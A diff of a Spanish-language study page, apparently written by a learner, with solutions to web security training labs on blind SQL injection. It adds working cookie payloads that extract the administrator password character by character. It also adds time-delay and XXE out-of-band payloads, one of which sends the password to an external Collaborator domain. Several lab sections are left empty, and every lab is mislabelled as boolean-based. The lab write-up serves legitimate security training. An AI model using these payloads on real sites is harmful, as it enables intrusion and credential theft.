@@ -391,7 +391,7 @@
                     Los resultados de la consulta SQL no se devuelven y no se muestran mensajes de error. 
                     Pero la aplicación incluye un mensaje de <code>Welcome Back!</code> en la página si la consulta devuelve alguna fila.
                     <br>
-                    La base de datos contiene una tabla diferente llamada users, con columnas llamadas usernamey password. 
+                    La base de datos contiene una tabla diferente llamada users, con columnas llamadas <code>username</code> y <code>password</code>. 
                     Debe explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del usuario <code>administrator</code>.<br>
 
                     Para resolver el laboratorio, inicie sesión como el usuario <code>administrator</code>
@@ -402,25 +402,44 @@
                   <ol>
                     <li>Visite la página principal de la tienda y utilice Burp Suite para interceptar y modificar la solicitud que contiene la
                       cookie <code>TrackingId</code>. Para simplificar, digamos que el valor original de la cookie es <code>TrackingId=xyz</code>. </li>
-                    <li></li>
-                    <li></li>
-                    <li></li>
-                    <li></li>
-                    <li></li>
-                    <li></li>
-                    <li></li>
-                    <li></li>
-                    <li></li>
-                    <li></li>
-                    <li></li>
-                    <li></li>
-                    <li></li>
-                    <li></li>
-                    <li></li>
-                    <li></li>
-                    <li></li>
+                    <li>Modificar la cookie <code>TrackingId</code>, cambiandola a: <br>
+                      <code>TrackingId=xyz' AND '1'='1</code><br>
+                      Debemos verificar que el mensaje de <code>Welcome Back!</code> aparezca en la respuesta.
+                    </li>
+                    <li>Ahora la cambiamos a: <br>
+                      <code>TrackingId=xyz' AND '1'='2</code>
+                    </li>
+                    <li>La cambiamos a: <br>
+                    <code>TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a</code>
+                    </li>
+                    <li>Ahora a:<br> <code>TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a</code></li>
+                    <li>Ahora debemos determinar cuantos caracteres hay en la contrase;a del amdinistrador para esto cambiamos el valor de la cookie a<br>
+                    <code>TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a</code><br>
+                  </li>
+                    <li>Envíe una serie de valores de seguimiento para probar diferentes longitudes de contraseña e ir aumentandolas hasta que desaparezca el mensaje de
+                      <code>Welcome Back</code>: <br> <code>TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a</code></li>
+                    <li>Después de determinar la longitud de la contraseña, el siguiente paso es probar el carácter en cada posición para determinar su valor. Esto implica un número mucho mayor de solicitudes, por lo que debe usar Burp Intruder. Envíe la solicitud en la que está trabajando a Burp Intruder, utilizando el menú contextual. </li>
+                    <li>En el intruder cambiamos el valor de la cookie a: <br>
+                      <code>TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a</code><br>
+                      Esto utiliza la funcion <code>SUBSTRING()</code> para extraer un solo carácter de la contraseña y probarlo contra un valor específico. Nuestro ataque recorrerá cada posición y posible valor, probando cada uno a su vez. 
+                    </li>
+                    <li>Coloque los marcadores de posición de carga útil alrededor de la final aEl carácter en el valor de la cookie. 
+                      Para hacer esto, seleccione solo el a, y haga clic en el botón Añadir §. A continuación, debería ver lo siguiente 
+                      como el valor de la cookie (tenga en cuenta los marcadores de posición de carga útil):<br>
+                      <code>TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§</code>
+                    </li>
+                    <li>Para probar el personaje en cada posición, deberás enviar cargas útiles adecuadas en la posición de carga útil que hayas definido. Puede suponer que la contraseña contiene solo caracteres alfanuméricos minúsculos. En el Panel lateral de cargas útiles, compruebe que la lista simple está seleccionada y debajo La configuración de carga útil añade las cargas útiles en el rango a - z y 0 - 9. Puede seleccionar estos fácilmente usando el menú desplegable Agregar desde la lista. </li>
+                    <li>Para poder saber cuándo se envió el carácter correcto, deberás aprovechar cada respuesta para la expresión Welcome back. Para hacer esto, haga clic en el Ficha para abrir el panel lateral Configuración. En la sección Grep - Match, borre las entradas existentes en la lista y, a continuación, agregue el valor Welcome back. </li>
+                    <li>Inicie el ataque haciendo clic en el botón Iniciar ataque. </li>
+                    <li>Revise los resultados del ataque para encontrar el valor del personaje en la primera posición. Deberías ver una columna en los resultados llamados Welcome back. Una de las filas debe tener una garrapata en esta columna. La carga útil que se muestra para esa fila es el valor del personaje en la primera posición. </li>
+                    <li>Ahora, simplemente necesita volver a ejecutar el ataque para cada una de las otras posiciones de caracteres en la contraseña, 
+                      para determinar su valor. Para hacer esto, vuelva a la pestaña Intruder y cambie el desplazamiento especificado de 1 a 2. 
+                      A continuación, debería ver lo siguiente como el valor de la cookie: <br><code>TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a</code></li>
+                    <li>Inicie el ataque modificado, revise los resultados y anote el carácter en el segundo desplazamiento. </li>
+                    <li>Continúe este proceso probando el desplazamiento 3, 4, y así sucesivamente, hasta que tenga toda la contraseña. </li>
+                    <li>En el navegador, haga clic en Mi cuenta para abrir la página de inicio de sesión. Utilice la contraseña para iniciar sesión como el usuario <code>administrator</code>. </li>
                   </ol>
-                  <h3>Evidencias</h3>
+                  <h3 class="text-center">Evidencias</h3>
                 </div>
               </details>
 
@@ -434,7 +453,7 @@
                     Los resultados de la consulta SQL no se devuelven y no se muestran mensajes de error. 
                     Pero la aplicación incluye un mensaje de <code>Welcome Back!</code> en la página si la consulta devuelve alguna fila.
                     <br>
-                    La base de datos contiene una tabla diferente llamada users, con columnas llamadas usernamey password. 
+                    La base de datos contiene una tabla diferente llamada users, con columnas llamadas <code>username</code> y <code>password</code>. 
                     Debe explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del usuario <code>administrator</code>.<br>
 
                     Para resolver el laboratorio, inicie sesión como el usuario <code>administrator</code>. 
@@ -443,9 +462,44 @@
                   <h3 class="text-center">Solucion del laboratorio</h3>
                   <p>LOs siguientes pasos fueron necesarios para la realizacion de este laboratorio</p>
                   <ol>
-                    <li>Con Burpsuite, interceptar y modificar la solicitud que establece el filtro de categoría de producto.</li>
-                    <li>Modificar el parámetro de categoría, dándole el valor <code>'+OR+1=1--'</code>.</li>
-                    <li>Enviar la solicitud y verificar que la respuesta ahora contenga uno o más productos no publicados.</li>
+                    <li>Visite la página principal de la tienda y utilice Burp Suite para interceptar y modificar la solicitud que contiene la
+                      cookie <code>TrackingId</code>. Para simplificar, digamos que el valor original de la cookie es <code>TrackingId=xyz</code>. </li>
+                    <li>Modificar la cookie <code>TrackingId</code>, cambiandola a: <br>
+                      <code>TrackingId=xyz' AND '1'='1</code><br>
+                      Debemos verificar que el mensaje de <code>Welcome Back!</code> aparezca en la respuesta.
+                    </li>
+                    <li>Ahora la cambiamos a: <br>
+                      <code>TrackingId=xyz' AND '1'='2</code>
+                    </li>
+                    <li>La cambiamos a: <br>
+                    <code>TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a</code>
+                    </li>
+                    <li>Ahora a:<br> <code>TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a</code></li>
+                    <li>Ahora debemos determinar cuantos caracteres hay en la contrase;a del amdinistrador para esto cambiamos el valor de la cookie a<br>
+                    <code>TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a</code><br>
+                  </li>
+                    <li>Envíe una serie de valores de seguimiento para probar diferentes longitudes de contraseña e ir aumentandolas hasta que desaparezca el mensaje de
+                      <code>Welcome Back</code>: <br> <code>TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a</code></li>
+                    <li>Después de determinar la longitud de la contraseña, el siguiente paso es probar el carácter en cada posición para determinar su valor. Esto implica un número mucho mayor de solicitudes, por lo que debe usar Burp Intruder. Envíe la solicitud en la que está trabajando a Burp Intruder, utilizando el menú contextual. </li>
+                    <li>En el intruder cambiamos el valor de la cookie a: <br>
+                      <code>TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a</code><br>
+                      Esto utiliza la funcion <code>SUBSTRING()</code> para extraer un solo carácter de la contraseña y probarlo contra un valor específico. Nuestro ataque recorrerá cada posición y posible valor, probando cada uno a su vez. 
+                    </li>
+                    <li>Coloque los marcadores de posición de carga útil alrededor de la final aEl carácter en el valor de la cookie. 
+                      Para hacer esto, seleccione solo el a, y haga clic en el botón Añadir §. A continuación, debería ver lo siguiente 
+                      como el valor de la cookie (tenga en cuenta los marcadores de posición de carga útil):<br>
+                      <code>TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§</code>
+                    </li>
+                    <li>Para probar el personaje en cada posición, deberás enviar cargas útiles adecuadas en la posición de carga útil que hayas definido. Puede suponer que la contraseña contiene solo caracteres alfanuméricos minúsculos. En el Panel lateral de cargas útiles, compruebe que la lista simple está seleccionada y debajo La configuración de carga útil añade las cargas útiles en el rango a - z y 0 - 9. Puede seleccionar estos fácilmente usando el menú desplegable Agregar desde la lista. </li>
+                    <li>Para poder saber cuándo se envió el carácter correcto, deberás aprovechar cada respuesta para la expresión Welcome back. Para hacer esto, haga clic en el Ficha para abrir el panel lateral Configuración. En la sección Grep - Match, borre las entradas existentes en la lista y, a continuación, agregue el valor Welcome back. </li>
+                    <li>Inicie el ataque haciendo clic en el botón Iniciar ataque. </li>
+                    <li>Revise los resultados del ataque para encontrar el valor del personaje en la primera posición. Deberías ver una columna en los resultados llamados Welcome back. Una de las filas debe tener una garrapata en esta columna. La carga útil que se muestra para esa fila es el valor del personaje en la primera posición. </li>
+                    <li>Ahora, simplemente necesita volver a ejecutar el ataque para cada una de las otras posiciones de caracteres en la contraseña, 
+                      para determinar su valor. Para hacer esto, vuelva a la pestaña Intruder y cambie el desplazamiento especificado de 1 a 2. 
+                      A continuación, debería ver lo siguiente como el valor de la cookie: <br><code>TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a</code></li>
+                    <li>Inicie el ataque modificado, revise los resultados y anote el carácter en el segundo desplazamiento. </li>
+                    <li>Continúe este proceso probando el desplazamiento 3, 4, y así sucesivamente, hasta que tenga toda la contraseña. </li>
+                    <li>En el navegador, haga clic en Mi cuenta para abrir la página de inicio de sesión. Utilice la contraseña para iniciar sesión como el usuario <code>administrator</code>. </li>
                   </ol>
                   <h3 class="text-center">Evidencias</h3>
                 </div>
@@ -455,22 +509,36 @@
                 <summary>Lab 13: Visible error-based SQL injection</summary>
                 <div class="contenido">
                   <h3 class="text-center">Descripción del laboratorio</h3>
-                  <p>Este laboratorio contiene una vulnerabilidad de inyeccion de SQL en el filtro de categoria de productos. 
-                    Cuando el usuario selecciona una categoría, la aplicación ejecuta una consulta SQL como la siguiente:<br>
-                    <div class="text-center"><code class="code-scrollable">SELECT * FROM products WHERE category = 'Gifts' AND released = 1</code></div>
-                    <br>
-                    Para resolver el laboratorio, se debe realizar un ataque de inyección SQL que haga que la aplicación 
-                    muestre uno o más productos no lanzados.
+                  <p> Este laboratorio contiene una vulnerabilidad de inyección SQL. La aplicación utiliza una cookie de seguimiento para análisis, 
+                    y realiza una consulta SQL que contiene el valor de la cookie enviada. Los resultados de la consulta SQL no se devuelven.<br>
+
+                    La base de datos contiene una tabla diferente llamada users, con columnas llamadas usernamey password. 
+                    Para resolver el laboratorio, encuentre una manera de filtrar la contraseña para el usuario <code>administrator</code>, luego inicie sesión en su cuenta. 
                   </p>
-                  <p><strong>Tipo de vulnerabilidaad: </strong>SQL Injection basada en manipulación lógica (Boolean-Based SQL Injection) en la cláusula WHERE.</p>
+                  <p><strong>Tipo de vulnerabilidad: </strong>SQL Injection basada en manipulación lógica (Boolean-Based SQL Injection) en la cláusula WHERE.</p>
                   <h3 class="text-center">Solucion del laboratorio</h3>
                   <p>LOs siguientes pasos fueron necesarios para la realizacion de este laboratorio</p>
                   <ol>
-                    <li>Con Burpsuite, interceptar y modificar la solicitud que establece el filtro de categoría de producto.</li>
-                    <li>Modificar el parámetro de categoría, dándole el valor <code>'+OR+1=1--'</code>.</li>
-                    <li>Enviar la solicitud y verificar que la respuesta ahora contenga uno o más productos no publicados.</li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
                   </ol>
-                  <h3>Evidencias</h3>
+                  <h3 class="text-center">Evidencias</h3>
                 </div>
               </details>
 
@@ -478,22 +546,24 @@
                 <summary>Lab 14: Blind SQL injection with time delays</summary>
                 <div class="contenido">
                   <h3 class="text-center">Descripción del laboratorio</h3>
-                  <p>Este laboratorio contiene una vulnerabilidad de inyeccion de SQL en el filtro de categoria de productos. 
-                    Cuando el usuario selecciona una categoría, la aplicación ejecuta una consulta SQL como la siguiente:<br>
-                    <div class="text-center"><code class="code-scrollable">SELECT * FROM products WHERE category = 'Gifts' AND released = 1</code></div>
-                    <br>
-                    Para resolver el laboratorio, se debe realizar un ataque de inyección SQL que haga que la aplicación 
-                    muestre uno o más productos no lanzados.
+                  <p> Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis, 
+                    y realiza una consulta SQL que contiene el valor de la cookie enviada.<br>
+
+                    Los resultados de la consulta SQL no se devuelven, y la aplicación no responde de manera diferente 
+                    en función de si la consulta devuelve alguna fila o causa un error. Sin embargo, dado que la consulta se ejecuta 
+                    de forma síncrona, es posible activar retardos de tiempo condicionales para inferir información.<br>
+
+                    Para resolver el laboratorio, aproveche la vulnerabilidad de inyección SQL para provocar un retraso de 10 segundos. 
                   </p>
                   <p><strong>Tipo de vulnerabilidaad: </strong>SQL Injection basada en manipulación lógica (Boolean-Based SQL Injection) en la cláusula WHERE.</p>
                   <h3 class="text-center">Solucion del laboratorio</h3>
                   <p>LOs siguientes pasos fueron necesarios para la realizacion de este laboratorio</p>
                   <ol>
-                    <li>Con Burpsuite, interceptar y modificar la solicitud que establece el filtro de categoría de producto.</li>
-                    <li>Modificar el parámetro de categoría, dándole el valor <code>'+OR+1=1--'</code>.</li>
-                    <li>Enviar la solicitud y verificar que la respuesta ahora contenga uno o más productos no publicados.</li>
+                    <li>Visite la página principal de la tienda y utilice Burp Suite para interceptar y modificar la solicitud que contiene la cookie <code>TrackingId</code>. </li>
+                    <li>Modificar la cookie <code>TrackingId=x'||pg_sleep(10)--</code>.</li>
+                    <li>Envíe la solicitud y observe que la aplicación tarda 10 segundos en responder. </li>
                   </ol>
-                  <h3>Evidencias</h3>
+                  <h3 class="text-center">Evidencias</h3>
                 </div>
               </details>
               
@@ -501,20 +571,37 @@
                 <summary>Lab 15: Blind SQL injection with time delays and information retrieval</summary>
                 <div class="contenido">
                   <h3 class="text-center">Descripción del laboratorio</h3>
-                  <p>Este laboratorio contiene una vulnerabilidad de inyeccion de SQL en el filtro de categoria de productos. 
-                    Cuando el usuario selecciona una categoría, la aplicación ejecuta una consulta SQL como la siguiente:<br>
-                    <div class="text-center"><code class="code-scrollable">SELECT * FROM products WHERE category = 'Gifts' AND released = 1</code></div>
-                    <br>
-                    Para resolver el laboratorio, se debe realizar un ataque de inyección SQL que haga que la aplicación 
-                    muestre uno o más productos no lanzados.
+                  <p> Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie 
+                    de seguimiento para análisis, y realiza una consulta SQL que contiene el valor de la cookie enviada.<br>
+
+                    Los resultados de la consulta SQL no se devuelven, y la aplicación no responde de manera diferente en 
+                    función de si la consulta devuelve alguna fila o causa un error. Sin embargo, dado que la consulta se 
+                    ejecuta de forma síncrona, es posible activar retardos de tiempo condicionales para inferir información.<br>
+                    La base de datos contiene una tabla diferente llamada <code>users</code>, con columnas llamadas <code>username</code> y <code>password</code>. 
+                    Debe explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del usuario <code>administrator</code>.
+                    Para resolver el laboratorio, inicie sesión como el usuario <code>administrador</code>. 
                   </p>
                   <p><strong>Tipo de vulnerabilidaad: </strong>SQL Injection basada en manipulación lógica (Boolean-Based SQL Injection) en la cláusula WHERE.</p>
                   <h3 class="text-center">Solucion del laboratorio</h3>
                   <p>LOs siguientes pasos fueron necesarios para la realizacion de este laboratorio</p>
                   <ol>
-                    <li>Con Burpsuite, interceptar y modificar la solicitud que establece el filtro de categoría de producto.</li>
-                    <li>Modificar el parámetro de categoría, dándole el valor <code>'+OR+1=1--'</code>.</li>
-                    <li>Enviar la solicitud y verificar que la respuesta ahora contenga uno o más productos no publicados.</li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
+                    <li></li>
                   </ol>
                   <h3>Evidencias</h3>
                 </div>
@@ -524,22 +611,25 @@
                 <summary>Lab 16: Blind SQL injection with out-of-band interaction</summary>
                 <div class="contenido">
                   <h3 class="text-center">Descripción del laboratorio</h3>
-                  <p>Este laboratorio contiene una vulnerabilidad de inyeccion de SQL en el filtro de categoria de productos. 
-                    Cuando el usuario selecciona una categoría, la aplicación ejecuta una consulta SQL como la siguiente:<br>
-                    <div class="text-center"><code class="code-scrollable">SELECT * FROM products WHERE category = 'Gifts' AND released = 1</code></div>
-                    <br>
-                    Para resolver el laboratorio, se debe realizar un ataque de inyección SQL que haga que la aplicación 
-                    muestre uno o más productos no lanzados.
+                  <p> Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento 
+                    para análisis, y realiza una consulta SQL que contiene el valor de la cookie enviada.<br>
+                    La consulta SQL se ejecuta de forma asíncrona y no tiene ningún efecto en la respuesta de 
+                    la aplicación. Sin embargo, puede activar interacciones fuera de banda con un dominio externo.<br>
+                    Para resolver el laboratorio, aproveche la vulnerabilidad de inyección SQL para provocar una búsqueda de DNS en Burp Collaborator. 
                   </p>
                   <p><strong>Tipo de vulnerabilidaad: </strong>SQL Injection basada en manipulación lógica (Boolean-Based SQL Injection) en la cláusula WHERE.</p>
                   <h3 class="text-center">Solucion del laboratorio</h3>
-                  <p>LOs siguientes pasos fueron necesarios para la realizacion de este laboratorio</p>
+                  <p>Los siguientes pasos fueron necesarios para la realizacion de este laboratorio</p>
                   <ol>
-                    <li>Con Burpsuite, interceptar y modificar la solicitud que establece el filtro de categoría de producto.</li>
-                    <li>Modificar el parámetro de categoría, dándole el valor <code>'+OR+1=1--'</code>.</li>
-                    <li>Enviar la solicitud y verificar que la respuesta ahora contenga uno o más productos no publicados.</li>
+                    <li>Visite la página principal de la tienda y utilice Burp Suite para interceptar y modificar la solicitud que contiene la cookie <code>TrackingId</code>. </li>
+                    <li>Modificar el TrackingIdCookie, cambiando a una carga útil que desencadenará una interacción con el servidor Colaborador. 
+                      Por ejemplo, puede combinar la inyección SQL con técnicas básicas de XXE de la siguiente manera: <br>
+                      <code>TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--</code>
+                    </li>
+                    <li>Haga clic con el botón derecho y seleccione "Insertar carga útil de Colaborador" para insertar un 
+                      subdominio de Burp Collaborator donde se indique en el modo modificado la cookie <code>TrackingId</code>. </li>
                   </ol>
-                  <h3>Evidencias</h3>
+                  <h3 class="text-center">Evidencias</h3>
                 </div>
               </details>
 
@@ -547,20 +637,33 @@
                 <summary>Lab 17: Blind SQL injection with out-of-band data exfiltration</summary>
                 <div class="contenido">
                   <h3 class="text-center">Descripción del laboratorio</h3>
-                  <p>Este laboratorio contiene una vulnerabilidad de inyeccion de SQL en el filtro de categoria de productos. 
-                    Cuando el usuario selecciona una categoría, la aplicación ejecuta una consulta SQL como la siguiente:<br>
-                    <div class="text-center"><code class="code-scrollable">SELECT * FROM products WHERE category = 'Gifts' AND released = 1</code></div>
-                    <br>
-                    Para resolver el laboratorio, se debe realizar un ataque de inyección SQL que haga que la aplicación 
-                    muestre uno o más productos no lanzados.
+                  <p> Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis,
+                     y realiza una consulta SQL que contiene el valor de la cookie enviada.<br>
+                     La consulta SQL se ejecuta de forma asíncrona y no tiene ningún efecto en la respuesta de la aplicación. 
+                     Sin embargo, puede activar interacciones fuera de banda con un dominio externo.<br>
+                    La base de datos contiene una tabla diferente llamada <code>users</code>, con columnas llamadas <code>username</code> y <code>password</code>. 
+                    Debe explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña de <code>administrator</code>.
+                    Para resolver el laboratorio, inicie sesión como el usuario <code>administrator</code>. 
                   </p>
-                  <p><strong>Tipo de vulnerabilidaad: </strong>SQL Injection basada en manipulación lógica (Boolean-Based SQL Injection) en la cláusula WHERE.</p>
+                  <p><strong>Tipo de vulnerabilidad: </strong>SQL Injection basada en manipulación lógica (Boolean-Based SQL Injection) en la cláusula WHERE.</p>
                   <h3 class="text-center">Solucion del laboratorio</h3>
-                  <p>LOs siguientes pasos fueron necesarios para la realizacion de este laboratorio</p>
+                  <p>Los siguientes pasos fueron necesarios para la realizacion de este laboratorio</p>
                   <ol>
-                    <li>Con Burpsuite, interceptar y modificar la solicitud que establece el filtro de categoría de producto.</li>
-                    <li>Modificar el parámetro de categoría, dándole el valor <code>'+OR+1=1--'</code>.</li>
-                    <li>Enviar la solicitud y verificar que la respuesta ahora contenga uno o más productos no publicados.</li>
+                    <li>Visite la página principal de la tienda y utilice Burp Suite Professional para interceptar y modificar la solicitud que contiene el cookie <code>TrackingId</code>. </li>
+                    <li>Modificar la cookie <code>TrackingId</code>, cambiando a una carga útil que filtrará la contraseña del administrador en una interacción con el servidor Colaborador. 
+                      Por ejemplo, puede combinar la inyección SQL con técnicas básicas de XXE de la siguiente manera: <br>
+                      <code>TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--</code></li>
+                    <li>Haga clic con el botón derecho y seleccione "Insertar carga útil de Colaborador" 
+                      para insertar un subdominio de Burp Collaborator donde se indique en el modo modificado de <code>TrackingId</code>. </li>
+                      <li>Vaya a la pestaña Colaborador y haga clic en "Encuestar ahora". Si no ve ninguna interacción en la lista, espere unos 
+                        segundos e inténtelo de nuevo, ya que la consulta del lado del servidor se ejecuta de forma asíncrona. </li>
+                      <li>Debería ver algunas interacciones de DNS y HTTP que fueron iniciadas por la aplicación como resultado
+                         de su carga útil. La contraseña de la administratorEl usuario debe aparecer en el subdominio de la 
+                         interacción, y puede ver esto dentro de la pestaña Colaborador. Para las interacciones DNS, el nombre 
+                         de dominio completo que se buscó se muestra en la pestaña Descripción. Para las interacciones HTTP, el 
+                         nombre de dominio completo se muestra en el encabezado Host en la pestaña Solicitud a Colaborador. </li>
+                      <li>En el navegador, haga clic en "Mi cuenta" para abrir la página de inicio de sesión. Utilice la contraseña para iniciar 
+                        sesión como el usuario <code>administrator</code>.</li>
                   </ol>
                   <h3>Evidencias</h3>
                 </div>
@@ -570,22 +673,29 @@
                 <summary>Lab 18: SQL injection with filter bypass via XML encoding</summary>
                 <div class="contenido">
                   <h3 class="text-center">Descripción del laboratorio</h3>
-                  <p>Este laboratorio contiene una vulnerabilidad de inyeccion de SQL en el filtro de categoria de productos. 
-                    Cuando el usuario selecciona una categoría, la aplicación ejecuta una consulta SQL como la siguiente:<br>
-                    <div class="text-center"><code class="code-scrollable">SELECT * FROM products WHERE category = 'Gifts' AND released = 1</code></div>
-                    <br>
-                    Para resolver el laboratorio, se debe realizar un ataque de inyección SQL que haga que la aplicación 
-                    muestre uno o más productos no lanzados.
+                  <p> Este laboratorio contiene una vulnerabilidad de inyección SQL en su función de comprobación de 
+                    stock. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que puede 
+                    utilizar un ataque de UNION para recuperar datos de otras tablas.<br>
+                    La base de datos contiene una tabla <code>users</code>, que contiene los nombres de usuario y contraseñas de los usuarios 
+                    registrados. Para resolver el laboratorio, realice un ataque de inyección SQL para recuperar las credenciales 
+                    del usuario administrador y, a continuación, inicie sesión en su cuenta. 
                   </p>
                   <p><strong>Tipo de vulnerabilidaad: </strong>SQL Injection basada en manipulación lógica (Boolean-Based SQL Injection) en la cláusula WHERE.</p>
                   <h3 class="text-center">Solucion del laboratorio</h3>
                   <p>LOs siguientes pasos fueron necesarios para la realizacion de este laboratorio</p>
                   <ol>
-                    <li>Con Burpsuite, interceptar y modificar la solicitud que establece el filtro de categoría de producto.</li>
-                    <li>Modificar el parámetro de categoría, dándole el valor <code>'+OR+1=1--'</code>.</li>
-                    <li>Enviar la solicitud y verificar que la respuesta ahora contenga uno o más productos no publicados.</li>
+                    <li>Observe que la función de verificación de existencias envía el <code>productId</code> y <code>storeIdA</code> la aplicación en formato XML. </li>
+                    <li>Enviar la solicitud <code>POST /product/stock</code> a Burp Repeater.</li>
+                    <li>En el repetidor de Burp, sondee el <code>storeId</code> para ver si se evalúa su entrada. 
+                      Por ejemplo, intente reemplazar el ID con expresiones matemáticas que se evalúen a otros ID potenciales, por ejemplo: <br>
+                      <code><storeId>1+1</storeId></code>
+                    </li>
+                    <li>Observe que su entrada parece ser evaluada por la aplicación, devolviendo el stock para diferentes tiendas. </li>
+                    <li>Intente determinar el número de columnas devueltas por la consulta original añadiendo una declaracion
+                      <code>UNION SELECT</code> al ID de la tienda original: <br><code><storeId>1 UNION SELECT NULL</storeId></code></li>
+                    <li>Observe que su solicitud ha sido bloqueada debido a que fue marcada como un posible ataque. </li>
                   </ol>
-                  <h3>Evidencias</h3>
+                  <h3 class="text-center">Evidencias</h3>
                 </div>
               </details>
             </div>
